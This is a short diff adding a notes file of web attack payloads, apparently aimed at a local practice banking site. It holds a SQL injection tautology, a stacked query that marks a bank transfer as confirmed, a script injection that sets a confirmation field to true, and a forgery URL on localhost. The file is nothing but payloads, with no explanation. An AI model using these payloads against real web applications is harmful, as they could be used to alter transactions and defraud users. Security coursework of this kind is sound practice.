@@ -1,0 +1,9 @@
+MYSQL INJECTION
+1236754 OR 1=1
+1 ; UPDATE banksite_transfer SET confirmed = 1 WHERE id = 3;
+
+XSS
+<script>document.getElementById("confirm").value="True"</script>
+
+XSRF
+127.0.0.1:8000/forgery
